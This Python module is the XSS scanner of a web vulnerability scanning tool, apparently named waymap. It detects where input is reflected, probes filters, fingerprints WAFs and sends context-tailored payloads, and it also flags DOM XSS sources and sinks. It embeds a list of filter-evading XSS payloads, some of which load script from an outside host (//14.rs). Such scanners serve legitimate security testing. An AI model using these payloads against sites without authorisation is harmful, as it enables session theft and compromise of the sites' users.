# Copyright (c) 2026 waymap developers
# See the file 'LICENSE' for copying permission.

"""XSS Injection Scanner Module."""

import html
import json
import os
import re
import requests
import secrets
from lib.core import http
from functools import lru_cache
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse, unquote

from lib.core.config import get_config
from lib.core.logger import get_logger
from lib.core.result_manager import ResultManager
from lib.core.state import stop_scan
from lib.ui import print_status, print_header, ask_continue_scanning
from lib.parse.random_headers import generate_random_headers

config = get_config()
logger = get_logger(__name__)

XSS_MARKER_PREFIX = "wymapxss"
FILTER_TOKENS = ("<", ">", '"', "'", "`", "-->", "</scRipT/>", "&lt;", "&gt;")
MAX_GENERATED_PAYLOADS = 36
MAX_EXTERNAL_SCRIPTS = 6
EVIDENCE_WINDOW = 90

DOM_SOURCE_RE = re.compile(
    r"\b(?:document\.(?:URL|documentURI|URLUnencoded|baseURI|cookie|referrer)|"
    r"location\.(?:href|search|hash|pathname)|window\.name|"
    r"history\.(?:pushState|replaceState)|(?:local|session)Storage)\b"
)
DOM_SINK_RE = re.compile(
    r"\b(?:eval|evaluate|execCommand|assign|navigate|showModalDialog|Function|"
    r"set(?:Timeout|Interval|Immediate)|execScript|document\.(?:write|writeln)|"
    r"[A-Za-z0-9_$.\[\]'\"-]+\.innerHTML|Range\.createContextualFragment|"
    r"(?:document|window)\.location)\b"
)

XSSTRIKE_FALLBACK_PAYLOADS = (
    '\'"</Script><Html Onmouseover=(confirm)()//',
    '<imG/sRc=l oNerrOr=(prompt)() x>',
    '<!--<iMg sRc=--><img src=x oNERror=(prompt)`` x>',
    '<deTails open oNToggle=confirm()>',
    '<img sRc=l oNerrOr=(confirm)() x>',
    '<svg/x=">"/onload=confirm()//',
    '<svg%0Aonload=%09((prompt))()//',
    '<iMg sRc=x:confirm`` oNlOad=eval(src)>',
    '<sCript x>confirm``</scRipt x>',
    '<Script x>prompt()</scRiPt x>',
    '<sCriPt sRc=//14.rs>',
    '<embed//sRc=//14.rs>',
    '<base href=//14.rs/><script src=/>',
    '<object//data=//14.rs>',
    '<s=" onclick=confirm``>clickme',
    '<svG oNLoad=confirm&#x28;1&#x29;>',
    '\'"><y///oNMousEDown=((confirm))()>Click',
    '<a/href=javascript&colon;confirm&#40;&quot;1&quot;&#41;>clickme</a>',
    '<img src=x onerror=confirm`1`>',
    '<svg/onload=confirm`1`>',
)


def _build_test_url(base_url: str, param_dict: Dict[str, str], param_key: str, payload: str) -> str:
    test_params = param_dict.copy()
    test_params[param_key] = payload
    query = urlencode(test_params, doseq=False)
    return f"{base_url}?{query}"


def _target_label(method: str, base_url: str, param_dict: Dict[str, str], param_key: str, payload: str) -> str:
    if method == "GET":
        return _build_test_url(base_url, param_dict, param_key, payload)
    return f"{method} {base_url}"


def _split_url(url: str) -> tuple[str, Dict[str, str]]:
    parsed = urlparse(url)
    base_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, "", parsed.fragment))
    params = {k: v[0] if v else "" for k, v in parse_qs(parsed.query, keep_blank_values=True).items()}
    return base_url, params


def _request_url(full_url: str):
    return http.get(
        full_url,
        headers=generate_random_headers(),
        timeout=config.REQUEST_TIMEOUT,
        verify=False,
    )


def _request_payload(method: str, base_url: str, param_dict: Dict[str, str], param_key: str, payload: str):
    test_params = param_dict.copy()
    test_params[param_key] = payload
    request_kwargs = {
        "headers": generate_random_headers(),
        "timeout": config.REQUEST_TIMEOUT,
        "verify": False,
    }
    if method == "POST":
        return http.post(base_url, data=test_params, **request_kwargs)
    return http.get(base_url, params=test_params, **request_kwargs)


def _payload_forms(payload: str) -> tuple[str, ...]:
    decoded = unquote(payload)
    return tuple(dict.fromkeys((payload, decoded, html.unescape(decoded))))


def _payload_reflected(response_text: str, payload: str) -> bool:
    return any(form and form in response_text for form in _payload_forms(payload))


def _proof_token() -> str:
    return f"waymap_xss_{secrets.token_hex(4)}"


def _tokenize_payload(payload: str, token: str) -> str:
    replacements = (
        ("confirm(1)", f"confirm('{token}')"),
        ("confirm()", f"confirm('{token}')"),
        ("confirm``", f"confirm`{token}`"),
        ("confirm`1`", f"confirm`{token}`"),
        ("(confirm)()", f"(confirm)('{token}')"),
        ("((confirm))()", f"((confirm))('{token}')"),
        ("prompt()", f"prompt('{token}')"),
        ("prompt``", f"prompt`{token}`"),
        ("(prompt)()", f"(prompt)('{token}')"),
        ("((prompt))()", f"((prompt))('{token}')"),
    )
    tokenized = payload
    for old, new in replacements:
        tokenized = tokenized.replace(old, new)
    return tokenized


def _evidence_snippet(response_text: str, token: str, payload: str) -> str:
    positions = [response_text.find(token)]
    positions.extend(response_text.find(form) for form in _payload_forms(payload))
    positions = [position for position in positions if position >= 0]
    if not positions:
        return ""
    center = min(positions)
    start = max(0, center - EVIDENCE_WINDOW)
    end = min(len(response_text), center + EVIDENCE_WINDOW)
    return response_text[start:end].replace("\r", " ").replace("\n", " ").strip()


def _proof_evidence(response_text: str, payload: str, token: str) -> Dict[str, Any]:
    payload_reflected = _payload_reflected(response_text, payload)
    token_reflected = token in response_text
    return {
        "confirmed": payload_reflected and token_reflected,
        "token": token,
        "payload_reflected": payload_reflected,
        "token_reflected": token_reflected,
        "snippet": _evidence_snippet(response_text, token, payload),
    }


def _tag_name(tag_text: str) -> str:
    match = re.match(r"<\s*/?\s*([a-zA-Z0-9:_-]+)", tag_text)
    return match.group(1).lower() if match else ""


def _is_inside_span(position: int, spans: list[tuple[int, int, str]]) -> str:
    for start, end, name in spans:
        if start <= position <= end:
            return name
    return ""


def _script_quote(script_text: str, local_position: int) -> str:
    before_marker = script_text[:local_position]
    for quote in ("'", '"', "`"):
        if len(re.findall(rf"(?<!\\){re.escape(quote)}", before_marker)) % 2:
            return quote
    return ""


def _js_context_breaker(script_text: str, marker: str) -> str:
    pre_context = script_text.split(marker, 1)[0]
    pre_context = re.sub(r"(?s)\{.*?\}|\(.*?\)|\".*?\"|'.*?'", "", pre_context)
    breakers = []
    for index, char in enumerate(pre_context):
        if char == "{":
            breakers.append("}")
        elif char == "(":
            breakers.append(")")
        elif char == "[":
            breakers.append("]")
        elif char == "/" and index + 1 < len(pre_context) and pre_context[index + 1] == "*":
            breakers.append("*/")
        elif char in "})]" and breakers:
            breakers.pop()
    return "".join(reversed(breakers))


def _attribute_details(response_text: str, position: int) -> Dict[str, str]:
    tag_start = response_text.rfind("<", 0, position)
    tag_end = response_text.find(">", position)
    tag_text = response_text[tag_start:tag_end + 1] if tag_start >= 0 and tag_end >= 0 else ""
    local_position = position - tag_start if tag_start >= 0 else 0
    before_marker = tag_text[:local_position]
    attr_match = re.search(r"([^\s=<>/]+)\s*=\s*(['\"`]?)\S*$", before_marker)
    if attr_match:
        return {
            "tag": _tag_name(tag_text),
            "type": "value",
            "quote": attr_match.group(2) or "",
            "name": attr_match.group(1).lower(),
        }
    name_match = re.search(r"([^\s=<>/]+)$", before_marker)
    return {
        "tag": _tag_name(tag_text),
        "type": "name" if name_match else "flag",
        "quote": "",
        "name": name_match.group(1).lower() if name_match else "",
    }


def _parse_reflection_contexts(response_text: str, marker: str) -> list[Dict[str, Any]]:
    comment_spans = [(m.start(), m.end(), "comment") for m in re.finditer(r"(?is)<!--.*?-->", response_text)]
    script_spans = [(m.start(), m.end(), "script") for m in re.finditer(r"(?is)<script\b[^>]*>.*?</script>", response_text)]
    bad_spans = [
        (m.start(), m.end(), m.group(1).lower())
        for m in re.finditer(r"(?is)<(style|template|textarea|title|noembed|noscript)\b[^>]*>.*?</\1>", response_text)
    ]
    contexts = []
    for match in re.finditer(re.escape(marker), response_text):
        position = match.start()
        bad_tag = _is_inside_span(position, bad_spans)
        context = _is_inside_span(position, comment_spans)
        details: Dict[str, str] = {"badTag": bad_tag}

        if not context:
            tag_start = response_text.rfind("<", 0, position)
            tag_end = response_text.find(">", position)
            next_tag_start = response_text.find("<", position + len(marker))
            in_tag = tag_start > response_text.rfind(">", 0, position) and tag_end >= 0
            if in_tag and (next_tag_start == -1 or tag_end < next_tag_start):
                context = "attribute"
                details.update(_attribute_details(response_text, position))
            else:
                context = _is_inside_span(position, script_spans)
                if context == "script":
                    script_start = max(response_text.rfind("<script", 0, position), 0)
                    script_text = response_text[script_start:position + len(marker)]
                    details["quote"] = _script_quote(script_text, position - script_start)
                    details["breaker"] = _js_context_breaker(script_text, marker)

        contexts.append({"position": position, "context": context or "html", "details": details})
    return contexts


def _filter_scores(method: str, base_url: str, param_dict: Dict[str, str], param_key: str, marker: str) -> Dict[str, bool]:
    probe = marker + "".join(FILTER_TOKENS) + marker
    try:
        response_text = _request_payload(method, base_url, param_dict, param_key, probe).text
    except requests.RequestException as e:
        logger.debug(f"Error checking XSS filters on {base_url}: {e}")
        return {token: False for token in FILTER_TOKENS}
    lowered = response_text.lower()
    return {token: (token in response_text or token.lower() in lowered) for token in FILTER_TOKENS}


def _probe_xss_context(method: str, base_url: str, param_dict: Dict[str, str], param_key: str) -> Dict[str, Any]:
    marker = f"{XSS_MARKER_PREFIX}{secrets.token_hex(4)}"
    full_url = _target_label(method, base_url, param_dict, param_key, marker)
    try:
        response = _request_payload(method, base_url, param_dict, param_key, marker)
    except requests.RequestException as e:
        if not stop_scan.is_set():
            logger.debug(f"Error probing XSS context on {full_url}: {e}")
        return {"reflected": False}

    if marker not in response.text:
        return {"reflected": False, "url": full_url, "headers": response.headers}

    contexts = _parse_reflection_contexts(response.text, marker)
    return {
        "reflected": True,
        "url": full_url,
        "headers": response.headers,
        "contexts": contexts,
        "filters": _filter_scores(method, base_url, param_dict, param_key, marker),
    }


def _add_payload(payloads: list[str], seen: set[str], payload: str) -> None:
    if payload and payload not in seen:
        payloads.append(payload)
        seen.add(payload)


@lru_cache(maxsize=1)
def _xsstrike_payload_entries() -> List[Dict[str, str]]:
    return [{"name": f"XSStrike Payload {index}", "payload": payload} for index, payload in enumerate(XSSTRIKE_FALLBACK_PAYLOADS, 1)]


def _generated_payloads(contexts: list[Dict[str, Any]], filters: Dict[str, bool], static_payloads: List[Dict[str, str]]) -> list[str]:
    payloads: list[str] = []
    seen: set[str] = set()
    can_open_tag = filters.get("<", False)
    can_close_tag = filters.get(">", False)
    tag_end = ">" if can_close_tag else "//"

    for occurrence in contexts:
        context = occurrence["context"]
        details = occurrence.get("details", {})
        bad_tag = details.get("badTag") or ""
        breaker = f"</{bad_tag}>" if bad_tag and can_open_tag and can_close_tag else ""

        if context in ("html", "comment"):
            if context == "comment":
                if not filters.get("-->", False):
                    continue
                breaker = "-->" + breaker
            if can_open_tag:
                _add_payload(payloads, seen, f"{breaker}<svg/onload=confirm(1){tag_end}")
                _add_payload(payloads, seen, f"{breaker}<img/src=x/onerror=confirm(1){tag_end}")

        elif context == "attribute":
            quote = details.get("quote") or '"'
            attr = details.get("name", "")
            if attr == "href":
                _add_payload(payloads, seen, "javascript:confirm(1)")
            if attr.startswith("on"):
                _add_payload(payloads, seen, ";confirm(1)//")
                _add_payload(payloads, seen, "confirm(1)//")
            if filters.get(quote, False):
                _add_payload(payloads, seen, f"{quote} autofocus onfocus=confirm(1) x={quote}")
                if can_open_tag and can_close_tag:
                    _add_payload(payloads, seen, f"{quote}><svg/onload=confirm(1)>")
            elif details.get("type") != "value":
                _add_payload(payloads, seen, "autofocus/onfocus=confirm(1)//")
            if attr == "srcdoc" and filters.get("&lt;", False) and filters.get("&gt;", False):
                _add_payload(payloads, seen, "&lt;svg/onload=confirm(1)&gt;")

        elif context == "script":
            quote = details.get("quote", "")
            breaker = details.get("breaker", "")
            if filters.get("</scRipT/>", False) and can_open_tag:
                _add_payload(payloads, seen, "</script><svg/onload=confirm(1)>")
            _add_payload(payloads, seen, f"{breaker};confirm(1)//")
            if quote and filters.get(quote, False):
                _add_payload(payloads, seen, f"{quote}{breaker};confirm(1)//")

    if not payloads:
        return []

    for payload in XSSTRIKE_FALLBACK_PAYLOADS:
        if len(payloads) >= MAX_GENERATED_PAYLOADS:
            break
        if can_open_tag or payload.startswith(("javascript:", ";", "confirm")):
            _add_payload(payloads, seen, payload)

    for entry in static_payloads:
        if len(payloads) >= MAX_GENERATED_PAYLOADS:
            break
        payload = entry.get("payload", "")
        if can_open_tag or payload.startswith(("javascript:", ";", "confirm", "alert", "prompt")):
            _add_payload(payloads, seen, payload)

    return payloads[:MAX_GENERATED_PAYLOADS]


def _script_blocks(response_text: str) -> list[str]:
    return [match.group(1) for match in re.finditer(r"(?is)<script\b[^>]*>(.*?)</script>", response_text)]


def _script_sources(page_url: str, response_text: str) -> list[str]:
    sources = []
    for match in re.finditer(r"(?is)<script\b[^>]*\bsrc\s*=\s*(['\"]?)([^'\"\s>]+)\1", response_text):
        src = urljoin(page_url, html.unescape(match.group(2)))
        if urlparse(src).netloc == urlparse(page_url).netloc:
            sources.append(src)
    return list(dict.fromkeys(sources))[:MAX_EXTERNAL_SCRIPTS]


def _controlled_variables(line: str, known: set[str]) -> set[str]:
    variables = set()
    if not DOM_SOURCE_RE.search(line) and not any(re.search(rf"\b{re.escape(var)}\b", line) for var in known):
        return variables
    for match in re.finditer(r"\b(?:var|let|const)\s+([A-Za-z_$][A-Za-z0-9_$]*)\b", line):
        variables.add(match.group(1))
    return variables


def _analyze_script_for_dom(script: str, source_url: str) -> list[Dict[str, str]]:
    findings = []
    known_variables: set[str] = set()
    for line_number, raw_line in enumerate(script.splitlines(), start=1):
        line = raw_line.strip()
        if not line:
            continue
        sources = [m.group(0) for m in DOM_SOURCE_RE.finditer(line)]
        sinks = [m.group(0) for m in DOM_SINK_RE.finditer(line)]
        known_variables.update(_controlled_variables(line, known_variables))
        variable_hits = [var for var in known_variables if re.search(rf"\b{re.escape(var)}\b", line)]
        if sources and sinks:
            confidence = "high"
        elif sinks and variable_hits:
            confidence = "medium"
        elif sources or sinks:
            confidence = "low"
        else:
            continue
        findings.append({
            "source_url": source_url,
            "line": str(line_number),
            "confidence": confidence,
            "sources": ", ".join(sorted(set(sources + variable_hits))),
            "sinks": ", ".join(sorted(set(sinks))),
            "snippet": line[:220],
        })
    return findings


def _analyze_dom_xss(page_url: str, response_text: str) -> list[Dict[str, str]]:
    findings = []
    for script in _script_blocks(response_text):
        findings.extend(_analyze_script_for_dom(script, page_url))
    for script_url in _script_sources(page_url, response_text):
        try:
            script_response = _request_url(script_url)
            if script_response.status_code < 400:
                findings.extend(_analyze_script_for_dom(script_response.text, script_url))
        except requests.RequestException as e:
            logger.debug(f"Error fetching script {script_url}: {e}")
    unique = {}
    for finding in findings:
        if finding["confidence"] == "low":
            continue
        key = (finding["source_url"], finding["line"], finding["snippet"])
        unique[key] = finding
    return list(unique.values())


def _extract_inputs(form_html: str) -> Dict[str, str]:
    inputs: Dict[str, str] = {}
    for match in re.finditer(r"(?is)<input\b([^>]*)>", form_html):
        attrs = match.group(1)
        name_match = re.search(r"(?is)\bname\s*=\s*(['\"]?)([^'\"\s>]+)\1", attrs)
        if not name_match:
            continue
        value_match = re.search(r"(?is)\bvalue\s*=\s*(['\"]?)([^'\"\s>]*)\1", attrs)
        inputs[html.unescape(name_match.group(2))] = html.unescape(value_match.group(2)) if value_match else ""
    for match in re.finditer(r"(?is)<textarea\b([^>]*)>(.*?)</textarea>", form_html):
        attrs, value = match.groups()
        name_match = re.search(r"(?is)\bname\s*=\s*(['\"]?)([^'\"\s>]+)\1", attrs)
        if name_match:
            inputs[html.unescape(name_match.group(2))] = html.unescape(value.strip())
    for match in re.finditer(r"(?is)<select\b([^>]*)>.*?</select>", form_html):
        attrs = match.group(1)
        name_match = re.search(r"(?is)\bname\s*=\s*(['\"]?)([^'\"\s>]+)\1", attrs)
        if name_match:
            inputs.setdefault(html.unescape(name_match.group(2)), "")
    return inputs


def _extract_form_targets(page_url: str, response_text: str) -> list[Dict[str, Any]]:
    targets = []
    for match in re.finditer(r"(?is)<form\b([^>]*)>(.*?)</form>", response_text):
        attrs, form_html = match.groups()
        action_match = re.search(r"(?is)\baction\s*=\s*(['\"]?)([^'\"\s>]*)\1", attrs)
        method_match = re.search(r"(?is)\bmethod\s*=\s*(['\"]?)(get|post)\1", attrs)
        action = html.unescape(action_match.group(2)) if action_match else page_url
        method = method_match.group(2).upper() if method_match else "GET"
        params = _extract_inputs(form_html)
        if params:
            targets.append({"method": method, "base_url": urljoin(page_url, action), "params": params, "source": page_url})
    return targets


@lru_cache(maxsize=1)
def _load_xsstrike_waf_signatures() -> Dict[str, Dict[str, str]]:
    path = os.path.join(config.BASE_DIR, "xsstrike", "db", "wafSignatures.json")
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except Exception as e:
        logger.debug(f"Could not load XSStrike WAF signatures: {e}")
        return {}


def _match_xsstrike_waf(response) -> str:
    if response.status_code < 400:
        return ""
    page = response.text
    code = str(response.status_code)
    headers = str(response.headers)
    best_score = 0
    best_name = ""
    for name, signature in _load_xsstrike_waf_signatures().items():
        score = 0
        for field, haystack, weight in (("page", page, 1), ("code", code, 0.5), ("headers", headers, 1)):
            pattern = signature.get(field) or ""
            if pattern and re.search(pattern, haystack, re.IGNORECASE):
                score += weight
        if score > best_score:
            best_score, best_name = score, name
    return best_name


def _detect_xss_waf(method: str, base_url: str, params: Dict[str, str]) -> str:
    if not params:
        return ""
    param_key = next(iter(params))
    try:
        response = _request_payload(method, base_url, params, param_key, '<script>alert("XSS")</script>')
    except requests.RequestException as e:
        logger.debug(f"Error during XSS WAF detection on {base_url}: {e}")
        return ""
    return _match_xsstrike_waf(response)


def _save_dom_findings(page_url: str, findings: list[Dict[str, str]], result_manager: ResultManager, verbose: bool) -> None:
    for finding in findings:
        record = {
            "url": page_url,
            "parameter": f"{finding['source_url']}:{finding['line']}",
            "payload": finding["snippet"],
            "context": "dom",
            "severity": "Medium" if finding["confidence"] != "high" else "High",
            "details": (
                f"DOM XSS signal in {finding['source_url']}:{finding['line']} "
                f"confidence={finding['confidence']} sources={finding['sources']} sinks={finding['sinks']} "
                f"snippet={finding['snippet']}"
            ),
            "timestamp": datetime.now().isoformat(),
        }
        if result_manager.has_duplicate(
            "XSS",
            ["url", "parameter", "payload"],
            record,
            finding_key="DOM",
        ):
            continue
        print_status("Potential DOM XSS Found!", "success")
        print_status(f"  URL: {page_url}", "info")
        print_status(f"  Source: {finding['source_url']}:{finding['line']}", "info")
        print_status(f"  Confidence: {finding['confidence']}", "info")
        if verbose:
            print_status(f"  Snippet: {finding['snippet']}", "debug")
        result_manager.add_finding("XSS", "DOM", record)


def _collect_xss_targets(urls: List[str], result_manager: ResultManager, verbose: bool) -> list[Dict[str, Any]]:
    targets: list[Dict[str, Any]] = []
    seen_targets: set[tuple[str, str, tuple[tuple[str, str], ...]]] = set()

    for url in urls:
        if stop_scan.is_set():
            break
        print_status(f"Testing URL: {url}", "info")
        base_url, param_dict = _split_url(url)
        if param_dict:
            targets.append({"method": "GET", "base_url": base_url, "params": param_dict, "source": url})

        try:
            response = _request_url(url)
        except requests.RequestException as e:
            logger.debug(f"Error fetching XSS page context for {url}: {e}")
            continue

        content_type = response.headers.get("Content-Type", "")
        if content_type and "html" not in content_type.lower():
            continue

        dom_findings = _analyze_dom_xss(response.url or url, response.text)
        if dom_findings:
            _save_dom_findings(response.url or url, dom_findings, result_manager, verbose)

        for form_target in _extract_form_targets(response.url or url, response.text):
            targets.append(form_target)

    deduped = []
    for target in targets:
        key = (target["method"], target["base_url"], tuple(sorted(target["params"].items())))
        if key in seen_targets:
            continue
        seen_targets.add(key)
        deduped.append(target)
    return deduped


def test_xss_payload(method: str, base_url: str, param_dict: Dict[str, str], parameter: str, payload: str) -> Dict[str, Any]:
    """Test a single XSS payload."""
    if stop_scan.is_set():
        return {'vulnerable': False}

    token = _proof_token()
    proof_payload = _tokenize_payload(payload, token)
    full_url = _target_label(method, base_url, param_dict, parameter, proof_payload)
    try:
        response = _request_payload(method, base_url, param_dict, parameter, proof_payload)
        evidence = _proof_evidence(response.text, proof_payload, token)
        if evidence["confirmed"]:
            return {
                'vulnerable': True,
                'url': full_url,
                'payload': proof_payload,
                'token': token,
                'evidence': evidence,
                'response': response,
                'headers': response.headers
            }
    except requests.RequestException as e:
        if not stop_scan.is_set():
            logger.debug(f"Error testing payload on {full_url}: {e}")

    return {'vulnerable': False}


def _scan_urls_with_payloads(
    urls: List[str],
    payloads: List[Dict[str, str]],
    thread_count: int,
    result_manager: ResultManager,
    no_prompt: bool,
    verbose: bool
) -> None:
    """Helper function to execute scanning logic."""
    detected_tech = None

    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        probe_futures = {}

        targets = _collect_xss_targets(urls, result_manager, verbose)
        if not targets:
            print_status("No XSS testable parameters or forms found", "warning")
            return

        for target in targets:
            if stop_scan.is_set():
                break

            method = target["method"]
            base_url = target["base_url"]
            param_dict = target["params"]
            waf_name = _detect_xss_waf(method, base_url, param_dict)
            if waf_name:
                print_status(f"XSS WAF Detected: {waf_name}", "warning")

            for param_key in param_dict.keys():
                if stop_scan.is_set():
                    break
                if verbose:
                    print_status(f"Probing XSS reflection context for {param_key}", "debug")
                future = executor.submit(_probe_xss_context, method, base_url, param_dict, param_key)
                probe_futures[future] = (method, base_url, param_dict, param_key)

        payload_futures = {}
        for future in as_completed(probe_futures):
            if stop_scan.is_set():
                break
            method, base_url, param_dict, param_key = probe_futures[future]
            try:
                probe = future.result()
            except Exception as e:
                logger.error(f"Error probing XSS context: {e}")
                continue
            if not probe.get("reflected"):
                if verbose:
                    print_status(f"No reflection found for {param_key}", "debug")
                continue

            contexts = probe.get("contexts", [])
            context_names = ", ".join(sorted({item["context"] for item in contexts})) or "unknown"
            print_status(f"Reflections found for {param_key}: {len(contexts)} ({context_names})", "info")

            for payload in _generated_payloads(contexts, probe.get("filters", {}), payloads):
                if stop_scan.is_set():
                    break
                full_url = _target_label(method, base_url, param_dict, param_key, payload)
                if result_manager.has_duplicate(
                    "XSS",
                    ["url", "parameter", "payload"],
                    {"url": full_url, "parameter": param_key, "payload": payload},
                    finding_key="Findings",
                ):
                    if verbose:
                        print_status(f"Skipping already tested: {full_url}", "debug")
                    continue
                if verbose:
                    print_status(f"Testing context payload on {param_key}", "debug")
                payload_future = executor.submit(test_xss_payload, method, base_url, param_dict, param_key, payload)
                target_key = (method, base_url, param_key, context_names)
                payload_futures[payload_future] = (full_url, param_key, payload, context_names, target_key)

        total_tasks = len(payload_futures)
        completed_tasks = 0
        reported_targets = set()
        for future in as_completed(payload_futures):
            if stop_scan.is_set():
                break
            completed_tasks += 1
            if completed_tasks % 100 == 0 or completed_tasks == total_tasks:
                print_status(f"Progress: {completed_tasks}/{total_tasks}", "info")

            try:
                result = future.result()
                queued_url, param_key, payload, context_names, target_key = payload_futures[future]

                if result['vulnerable']:
                    if target_key in reported_targets:
                        continue
                    reported_targets.add(target_key)
                    full_url = result.get("url", queued_url)
                    proof_payload = result.get("payload", payload)
                    proof_token = result.get("token", "")
                    evidence = result.get("evidence", {})
                    if detected_tech is None:
                        headers = result.get('headers', {})
                        detected_tech = headers.get('X-Powered-By', headers.get('Server', 'Unknown'))
                        print_status(f"Web Technology: {detected_tech}", "info")

                    print_status("Vulnerability Found!", "success")
                    print_status(f"  URL: {full_url}", "info")
                    print_status(f"  Parameter: {param_key}", "info")
                    print_status(f"  Context: {context_names}", "info")
                    print_status(f"  Payload: {proof_payload}", "info")
                    print_status(f"  Proof Token: {proof_token}", "info")
                    print_status("  Confirmations: marker reflection, executable context, tokenized payload reflection", "info")
                    if evidence.get("snippet"):
                        print_status(f"  Evidence: {evidence['snippet']}", "info")

                    logger.log_vulnerability_found("XSS", full_url, f"Param: {param_key}")

                    result_manager.add_finding("XSS", "Findings", {
                        'url': full_url,
                        'parameter': param_key,
                        'context': context_names,
                        'payload': proof_payload,
                        'proof_token': proof_token,
                        'poc_url': full_url,
                        'evidence': evidence,
                        'confirmations': [
                            'marker reflected before exploitation',
                            'reflection context identified',
                            'filter probe allowed executable characters',
                            'tokenized payload reflected in response',
                        ],
                        'injected': True,
                        'timestamp': datetime.now().isoformat()
                    })

                    if not no_prompt:
                        if not ask_continue_scanning():
                            print_status("Stopping scan...", "warning")
                            stop_scan.set()
                            return

            except Exception as e:
                logger.error(f"Error processing result: {e}")


def perform_xss_scan(
    crawled_urls: List[str],
    thread_count: int = 1,
    no_prompt: bool = False,
    verbose: bool = False
) -> None:
    """Perform XSS scan on a list of URLs."""
    if not crawled_urls:
        print_status("No URLs to scan", "warning")
        return

    stop_scan.clear()
    thread_count = max(1, min(thread_count, config.MAX_THREADS))

    try:
        domain = urlparse(crawled_urls[0]).netloc
    except Exception:
        domain = "unknown_domain"

    result_manager = ResultManager(domain)

    print_header("Context-Aware XSS Scan", color="cyan")
    _scan_urls_with_payloads(crawled_urls, _xsstrike_payload_entries(), thread_count, result_manager, no_prompt, verbose)
